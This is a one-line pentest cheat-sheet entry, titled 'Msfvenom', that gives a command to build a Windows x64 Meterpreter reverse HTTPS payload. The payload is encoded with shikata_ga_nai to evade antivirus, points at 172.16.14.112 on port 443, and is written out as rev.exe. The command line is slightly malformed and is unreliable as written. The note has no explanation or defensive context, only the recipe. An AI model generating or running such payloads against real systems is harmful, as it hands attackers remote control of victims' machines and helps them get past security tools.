# Msfvenom
Create with:

msfvenom --platform Windows -p windows/x64/meterpreter_reverse_https RHOST 172.16.14.112 RPORT 443-e x86/shikata_ga_nai -f exe -o rev.exe
